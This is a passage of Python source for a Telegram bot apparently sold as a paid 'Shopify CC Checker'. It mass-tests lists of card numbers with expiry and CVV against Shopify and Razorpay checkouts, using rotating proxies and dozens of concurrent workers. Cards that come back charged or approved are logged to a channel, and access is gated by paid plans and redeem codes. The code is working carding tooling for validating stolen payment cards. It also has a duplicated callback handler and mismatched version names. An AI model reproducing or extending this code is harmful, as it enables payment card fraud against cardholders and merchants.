                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}


# ─── BOT HANDLERS ───────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/start(?:\s|$)'))
async def start(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except Exception:
        username = "User"

    # Channel verification check (only once)
    if not is_user_verified(user_id) and user_id not in ADMIN_ID:
        join_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome to VOIDRA × V2</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔒 <b>Access Restricted</b>\n\n"
            f"Please join all the following channels to continue:\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )

        buttons = [
            [
                Button.url("LOGS", LOGS_CHANNEL, style="success"),
                Button.url("CHECKING", CHECKING_CHANNEL, style="success"),
            ],
            [
                Button.url("UPDATES", UPDATES_CHANNEL, style="success"),
            ],
            [
                Button.inline("JOINED", b"verify_joined", style="danger"),
            ]
        ]

        await event.reply(premium_emoji(join_text), buttons=buttons, parse_mode='html')
        return

    # Normal flow if verified
    assign_free_plan(user_id)

    users_data = load_users_data()
    uid = str(user_id)
    user_data = users_data.get(uid)
    is_free_user = (user_data and user_data.get('plan') == 'FREE') and user_id not in ADMIN_ID

    if is_free_user:
        cc_used  = user_data.get('cc_used', 0)
        cc_left  = max(0, user_data.get('cc_limit', 100) - cc_used)
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🆓 <b>Free Plan Activated!</b>\n"
            f"  📊 {cc_left} / 100 CC checks left\n"
            f"  🏠 Group-only checking\n\n"
            f"👇 <b>Join our group to start checking:</b>\n"
            f"  {GROUP_LINK}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Want more? Use /plan to upgrade\n"
            f"💡 Made by <b>@UNTAMEDU</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=True)
    else:
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 <b>Shopify CC Checker</b>\n"
            f"  Fast  ·  Accurate  ·  Premium\n\n"
            f"📌 <b>Quick Start:</b>\n"
            f"  💳 <code>/cc 4111...|12|26|123</code>\n"
            f"  📂 <code>/chk</code>  — reply to .txt for mass check\n"
            f"  🔌 <code>/addproxy</code>  — add your proxies\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Made by <b>@UNTAMEDU</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=False)

    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')


# ================== JOINED BUTTON VERIFICATION ==================
@bot.on(events.CallbackQuery(data=b"verify_joined"))
async def verify_joined_callback(event):
    user_id = event.sender_id

    if is_user_verified(user_id):
        await event.answer("✅ Already verified!", alert=True)
        return

    channels_to_check = [
        ("LOGS", LOGS_CHANNEL),
        ("CHECKING", CHECKING_CHANNEL),
        ("UPDATES", UPDATES_CHANNEL)
    ]

    not_joined = []

    for name, invite_link in channels_to_check:
        try:
            entity = await bot.get_entity(invite_link)
            participant = await bot.get_participant(entity, user_id)
            if participant is None:
                not_joined.append(name)
        except:
            not_joined.append(name)

    if not_joined:
        await event.answer(f"❌ Please join all channels first!\nMissing: {', '.join(not_joined)}", alert=True)
        return

    # All channels joined
    mark_user_verified(user_id)
    await event.answer("✅ Verification successful! Welcome.", alert=True)

    # Send normal welcome
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    assign_free_plan(user_id)
    welcome_text = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ <b>Welcome, @{username}!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ <b>Verification Complete</b>\n\n"
        f"🤖 <b>Shopify CC Checker</b>\n"
        f"  Fast  ·  Accurate  ·  Premium\n\n"
        f"💡 Made by <b>@UNTAMEDU</b>"
    )
    buttons = get_main_menu_keyboard(user_id, is_free=False)
    await event.respond(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')


# ================== JOINED BUTTON CALLBACK ==================
@bot.on(events.CallbackQuery(data=b"verify_joined"))
async def verify_joined_callback(event):
    user_id = event.sender_id

    if is_user_verified(user_id):
        await event.answer("✅ You are already verified!", alert=True)
        return

    channels = [
        ("LOGS", LOGS_CHANNEL),
        ("CHECKING", CHECKING_CHANNEL),
        ("UPDATES", UPDATES_CHANNEL),
    ]

    not_joined = []

    for name, link in channels:
        try:
            entity = await bot.get_entity(link)
            await bot(GetParticipantRequest(entity, user_id))
            # Success → user is member
        except UserNotParticipantError:
            not_joined.append(name)
        except Exception as e:
            print(f"[Channel Verification] {name} failed: {str(e)[:100]}")
            not_joined.append(name)

    if not_joined:
        await event.answer(
            f"❌ Please join all channels first!\nMissing: {', '.join(not_joined)}",
            alert=True
        )
        return

    # User has joined all channels
    mark_user_verified(user_id)
    await event.answer("✅ Verification successful! Welcome.", alert=True)

    # Delete the verification message
    try:
        await event.delete()
    except:
        pass

    # Send normal welcome message
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    assign_free_plan(user_id)

    # ================== VERIFICATION SUCCESS ANIMATION ==================
    # Step 1
    msg = await event.respond(premium_emoji(
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔄 <b>Verifying your access...</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    ), parse_mode='html')

    await asyncio.sleep(0.9)

    # Step 2 - Replace text
    try:
        await msg.edit(premium_emoji(
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ <b>Access Verified!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode='html')
    except:
        pass

    await asyncio.sleep(0.8)

    # Step 3 - Final beautiful message (replace again)
    final_text = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Verification Successful</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎉 Welcome to VOIDRA × V1\n\n"
        f"⚡ Your access has been unlocked!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Made by <b>@UNTAMEDU</b>"
    )

    buttons = get_main_menu_keyboard(user_id, is_free=False)

    try:
        await msg.edit(premium_emoji(final_text), buttons=buttons, parse_mode='html')
    except:
        await event.respond(premium_emoji(final_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"stop_proxy_check"))
async def stop_proxy_check_callback(event):
    if current_proxy_check.get('tasks'):
        for t in current_proxy_check['tasks']:
            if not t.done():
                t.cancel()

        alive = current_proxy_check.get('alive_proxies', [])
        if alive:
            try:
                async with aiofiles.open(PROXY_FILE, 'a') as f:
                    for proxy in alive:
                        await f.write(f"{proxy}\n")
            except:
                pass

        await event.answer(f"⛔ Stopped! Saved {len(alive)} alive proxies.", alert=True)
    else:
        await event.answer("No active proxy check running.", alert=True)


@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = (
        "📋 <b>Commands</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🛒 <b>Shopify Gate</b>\n"
        "  <code>/cc 4111|12|26|123</code>  — single card\n"
        "  <code>/chk</code>  — reply to .txt → mass check\n\n"
        "💳 <b>Razorpay Gate</b>  <i>(🥇 PREMIUM / 👑 VIP only)</i>\n"
        "  <code>/rz 4111|12|26|123</code>  — single card\n"
        "  <code>/mrz</code>  — reply to .txt → mass check\n\n"
        "💎 <b>Plans & Access</b>\n"
        "  <code>/plan</code>    — view available plans\n"
        "  <code>/redeem CODE</code> — activate a code\n"
        "  <code>/myplan</code>  — check your plan status\n\n"
        "🌐 <b>Site Management</b>\n"
        "  <code>/site</code>  — remove dead sites\n"
        "  <code>/rm site.com</code>  — remove one site\n\n"
        "🔌 <b>Proxy Management</b>\n"
        "  <code>/addproxy ip:port:u:p</code>  — add proxy\n"
        "  <code>/proxy</code>  — clean dead proxies\n"
        "  <code>/getproxy</code>  — view all proxies\n"
        "  <code>/chkproxy ip:port</code>  — test one proxy\n"
        "  <code>/rmproxy ip:port</code>  — remove one proxy\n"
        "  <code>/rmproxyindex 1,3,5</code>  — remove by #\n"
        "  <code>/clearproxy</code>  — wipe all (saves backup)\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )

    buttons = [[Button.inline("Back", b"main_menu", style="danger")]]
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.answer("❌ Access Denied. Admin only.", alert=True)
        return

    admin_text = (
        "👑 <b>Admin Panel</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎟️ <b>Generate Redeem Code</b>\n"
        "Select a plan to instantly generate a code:\n\n"
        "🌐 <b>Sites Management</b>\n"
        "  <code>/addsites</code>  — reply to .txt to add sites\n"
        "  <code>/getsites</code>  — download sites.txt\n\n"
        "📊 <b>Commands</b>\n"
        "  <code>/listusers</code> — active premium users\n"
        "  <code>/stats</code>     — bot stats\n"
        "  <code>/listcodes</code> — all generated codes"
    )

    buttons = [
        [
            Button.inline("FREE",     b"gencode_FREE",     style="success"),
            Button.inline("BASIC",    b"gencode_BASIC",    style="success"),
        ],
        [
            Button.inline("STANDARD", b"gencode_STANDARD", style="success"),
            Button.inline("PREMIUM",  b"gencode_PREMIUM",  style="success"),
        ],
        [
            Button.inline("VIP",      b"gencode_VIP",      style="success"),
        ],
        [Button.inline("Back", b"main_menu", style="danger")],
    ]
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except Exception:
        username = "User"

    users_data = load_users_data()
    uid = str(user_id)
    user_data_m = users_data.get(uid)
    is_free_user_m = (user_data_m and user_data_m.get('plan') == 'FREE') and user_id not in ADMIN_ID

    if is_free_user_m:
        cc_used  = user_data_m.get('cc_used', 0)
        cc_left  = max(0, user_data_m.get('cc_limit', 100) - cc_used)
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🆓 <b>Free Plan Active</b>\n"
            f"  📊 {cc_left} / 100 CC checks left\n"
            f"  🏠 Group-only checking\n\n"
            f"👇 <b>Join our group:</b>\n"
            f"  {GROUP_LINK}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Upgrade via /plan\n"
            f"💡 Made by <b>@UNTAMEDU</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=True)
    else:
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>Welcome, @{username}!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 <b>Shopify CC Checker</b>\n"
            f"  Fast  ·  Accurate  ·  Premium\n\n"
            f"📌 <b>Quick Start:</b>\n"
            f"  💳 <code>/cc 4111...|12|26|123</code>\n"
            f"  📂 <code>/chk</code>  — reply to .txt for mass check\n"
            f"  🔌 <code>/addproxy</code>  — add your proxies\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Made by <b>@UNTAMEDU</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=False)

    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    check_status = can_check(user_id, event.is_private)
    if check_status == 'no_plan':
        await event.reply(premium_emoji(
            "❌ <b>No Plan Found</b>\n\n"
            "You need a plan to check cards.\n"
            "💡 Use /plan to see available plans\n"
            "💡 Use /redeem CODE to activate"
        ), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji(
            "⏰ <b>Plan Expired</b>\n\n"
            "Your plan has expired.\n"
            "💡 Use /plan to purchase a new plan\n"
            "💡 Or /redeem CODE to reactivate"
        ), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            "🆓 <b>Free Plan — Group Only</b>\n\n"
            "Free users can only check inside our group.\n\n"
            f"👇 <b>Join here and check there:</b>\n"
            f"  {GROUP_LINK}\n\n"
            "💡 Upgrade your plan for bot access: /plan"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK)]], parse_mode='html')
        return
    if check_status == 'cc_limit':
        await event.reply(premium_emoji(
            "📊 <b>CC Limit Reached!</b>\n\n"
            "You've used all your CC checks.\n"
            "💡 Use /plan to purchase more\n"
            "💡 Use /redeem CODE to reactivate"
        ), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    checking_msg = (
        f"⏳  𝗜𝗦 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 . . . .\n\n"
        f"💳 Card » <code>{card}</code>\n"
        f"🌐 Gateway » 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙋𝙖𝙮𝙢𝙚𝙣𝙩\n"
        f"🔍 Status » 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚...\n\n"
        f"⚡ Powered by @UNTAMEDU"
    )
    status_msg = await event.reply(premium_emoji(checking_msg), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        increment_cc_used(user_id)

        if result['status'] == 'Charged':
            status_header = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
            await log_hit_to_channel(result, 'Charged', user_id, "User", check_type="Single CC Check")
        elif result['status'] == 'Approved':
            status_header = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"
            await log_hit_to_channel(result, 'Approved', user_id, "User", check_type="Single CC Check")
        else:
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"

        rem = get_cc_remaining(user_id)
        rem_str = "∞" if rem == -1 else str(rem)

        final_resp = (
            f"{status_header}\n\n"
            f"💳 CC <code>{result['card']}</code>\n\n"
            f"🛒 Gateway {result.get('gateway', 'Unknown')}\n"
            f"📝 Response {result['message']}\n"
            f"💸 Price {result.get('price', '-')}\n\n"
            f"🆔 BIN Info {brand} - {bin_type} - {level}\n"
            f"🏦 Bank {bank}\n"
            f"🥰 Country {country} {flag}\n\n"
            f"💡 Made by @UNTAMEDU"
        )

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/chk(?:\s|$)'))
async def check_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id  # group mein = group ID, private mein = user ID

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    if not is_premium(user_id):
        await event.reply(premium_emoji(
            "❌ <b>Access Denied</b>\n\n"
            "You need a plan to use this bot.\n"
            "💡 Use /plan to see available plans\n"
            "💡 Use /redeem CODE to activate"
        ), parse_mode='html')
        return

    check_status = can_check(user_id, event.is_private)
    if check_status == 'no_plan':
        await event.reply(premium_emoji(
            "❌ <b>No Plan Found</b>\n\n"
            "You need a plan to check cards.\n"
            "💡 Use /plan to see available plans\n"
            "💡 Use /redeem CODE to activate"
        ), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji(
            "⏰ <b>Plan Expired</b>\n\n"
            "Your plan has expired.\n"
            "💡 Use /plan to purchase a new plan\n"
            "💡 Or /redeem CODE to reactivate"
        ), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            "🆓 <b>Free Plan — Group Only</b>\n\n"
            "Free users can only check inside our group.\n\n"
            f"👇 <b>Join here and check there:</b>\n"
            f"  {GROUP_LINK}\n\n"
            "💡 Upgrade your plan for bot access: /plan"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK)]], parse_mode='html')
        return
    if check_status == 'cc_limit':
        await event.reply(premium_emoji(
            "📊 <b>CC Limit Reached!</b>\n\n"
            "You've used all your CC checks.\n"
            "💡 Use /plan to purchase more\n"
            "💡 Use /redeem CODE to reactivate"
        ), parse_mode='html')
        return

    # ─── ONE CHECK AT A TIME RULE ─────────────────────────────────────────────
    if user_id in user_active_check:
        current = user_active_check[user_id]
        session_type = "🛒 Shopify" if current['type'] == 'chk' else "💳 Razorpay"
        await event.reply(premium_emoji(
            f"🚫 <b>Already Running!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ <b>Active Session:</b>  {session_type}\n\n"
            f"You already have a check running.\n"
            f"Wait for it to finish, then start a new one.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Use STOP button to cancel the current check."
        ), parse_mode='html')
        return
    # ──────────────────────────────────────────────────────────────────────────

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"⚠️ File has {len(cards)} cards. Limiting to 5000."), parse_mode='html')
        cards = cards[:5000]

    # Per-session CC limit for ALL plans (FREE + Paid)
    # This replaces the old cumulative lifetime limit system.
    if user_id not in ADMIN_ID:
        users_data_chk = load_users_data()
        user_plan_chk  = users_data_chk.get(str(user_id), {}).get('plan', 'FREE')
        plan_data = PLANS.get(user_plan_chk, PLANS['FREE'])

        SESSION_LIMIT = plan_data['cc_limit'] if user_plan_chk != 'FREE' else 100

        if len(cards) > SESSION_LIMIT:
            total_input = len(cards)
            cards = cards[:SESSION_LIMIT]
            plan_emoji = plan_data.get('emoji', '💎')
            await status_msg.edit(premium_emoji(
                f"{plan_emoji} <b>{user_plan_chk} Plan</b> — checking first <b>{SESSION_LIMIT}</b> of {total_input} cards\n"
                f"💡 This is your per-session limit. You can check again after this run."
            ), parse_mode='html')
            await asyncio.sleep(1)

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔥 Starting check for <b>{total_cards}</b> cards..."), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    # Register user for one-at-a-time check
    user_active_check[user_id] = {
        'type': 'chk',
        'session_key': session_key,
        'chat_id': chat_id,
        'msg_id': status_msg.id
    }

    # Pre-load once — avoids disk reads per card across 20 workers
    preloaded_sites   = load_sites()
    preloaded_proxies = load_proxies()

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time(),
        'last_card': '',
        'last_response': '',
        'last_price': '-',
        'last_gateway': 'Unknown'
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)

        last_update_time = [time.time()]

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return

                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                if not preloaded_sites or not preloaded_proxies:
                    break

                res = await check_card_with_retry(card, preloaded_sites, preloaded_proxies, max_retries=1)

                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')

                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(chat_id, res, 'Charged', username)
                    await log_hit_to_channel(res, 'Charged', user_id, username, check_type="Shopify Mass Check")
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(chat_id, res, 'Approved', username)
                    await log_hit_to_channel(res, 'Approved', user_id, username, check_type="Shopify Mass Check")
                else:
                    all_results['dead'].append(res)

                queue.task_done()

                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(35)]

        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(chat_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        # Clean up one-at-a-time lock
        if user_id in user_active_check:
            del user_active_check[user_id]

        # Batch update CC usage once at session end — avoids race condition with 10 workers
        total_checked = len(all_results['charged']) + len(all_results['approved']) + len(all_results['dead'])
        if total_checked > 0:
            increment_cc_used(user_id, total_checked)

        try:
            await status_msg.delete()
        except Exception:
            pass

        await send_final_results(chat_id, all_results)


@bot.on(events.NewMessage(pattern=r'^/addproxy(?:\s|$)'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        text = event.message.text or ''
        parts = text.split(None, 1)
        rest = parts[1] if len(parts) > 1 else ''

        if '\n' in rest:
            proxies_to_add = [line.strip() for line in rest.splitlines() if line.strip()]
        else:
            proxies_to_add = [tok.strip() for tok in rest.split() if tok.strip()]

        if not proxies_to_add:
            await event.reply(premium_emoji(
                "❌ Usage:\n"
                "<code>/addproxy ip:port:user:pass</code>\n"
                "or multiple, one per line:\n"
                "<code>/addproxy\nip1:port1:user1:pass1\nip2:port2:user2:pass2</code>"
            ), parse_mode='html')
            return

        current_proxies = load_proxies()
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All proxies already exist in the list."), parse_mode='html')
            return

        # Beautiful UI - Start testing
        status_msg = await event.reply(premium_emoji(
            f"🔄 <b>Verifying Proxies...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Total Submitted : <b>{len(proxies_to_add)}</b>\n"
            f"🔢 New Proxies     : <b>{len(new_proxies)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Testing each proxy, please wait..."
        ), buttons=[[Button.inline("STOP", b"stop_proxy_check", style="danger")]], parse_mode='html')

        alive_proxies = []
        dead_proxies = []

        # Concurrent proxy checking with limit
        semaphore = asyncio.Semaphore(12)

        async def test_one_proxy(proxy):
            async with semaphore:
                return await test_proxy(proxy)

        tasks = [asyncio.create_task(test_one_proxy(p)) for p in new_proxies]

        # Store tasks for STOP button
        current_proxy_check['tasks'] = tasks
        current_proxy_check['alive_proxies'] = alive_proxies
        current_proxy_check['dead_proxies'] = dead_proxies
        current_proxy_check['status_msg'] = status_msg

        done_count = 0
        for coro in asyncio.as_completed(tasks):
            try:
                result = await coro
                proxy = new_proxies[done_count]  # approximate order
                if result.get('status') == 'alive':
                    alive_proxies.append(proxy)
                else:
                    dead_proxies.append(proxy)
            except Exception:
                dead_proxies.append(new_proxies[done_count])

            done_count += 1

            # Update progress
            if done_count % 5 == 0 or done_count == len(new_proxies):
                try:
                    await status_msg.edit(premium_emoji(
                        f"🔄 <b>Verifying Proxies...</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ Alive  : <b>{len(alive_proxies)}</b>\n"
                        f"❌ Dead   : <b>{len(dead_proxies)}</b>\n"
                        f"📊 Progress : {done_count}/{len(new_proxies)}"
                    ), parse_mode='html')
                except:
                    pass

        # Save only alive proxies
        if alive_proxies:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                for proxy in alive_proxies:
                    await f.write(f"{proxy}\n")

        # Beautiful final result
        result_text = (
            f"✅ <b>Proxy Verification Complete</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Total Submitted : <b>{len(proxies_to_add)}</b>\n"
            f"🔢 New Submitted   : <b>{len(new_proxies)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>Added (Working)</b> : <b>{len(alive_proxies)}</b>\n"
            f"❌ <b>Skipped (Dead)</b>  : <b>{len(dead_proxies)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )

        if alive_proxies:
            result_text += f"\n\n🎉 Successfully added <b>{len(alive_proxies)}</b> working proxies!"
        else:
            result_text += f"\n\n⚠️ No working proxies found. Nothing was added."

        await status_msg.edit(premium_emoji(result_text), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/proxy(?:\s|$)'))
async def proxy_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ proxy.txt is empty."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(proxies)} proxies..."), parse_mode='html')

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(premium_emoji(
                f"🔄 Checking proxies...\n\n"
                f"Checked: {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n"
                f"Alive: {len(alive_proxies)}\nDead: {len(dead_proxies)}"
            ), parse_mode='html')

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        await status_msg.edit(premium_emoji(
            f"✅ Proxy check complete!\n\n"
            f"Total: {len(proxies)}\nAlive: {len(alive_proxies)}\nRemoved: {len(dead_proxies)}"
        ), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ Proxy is ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ Proxy is DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

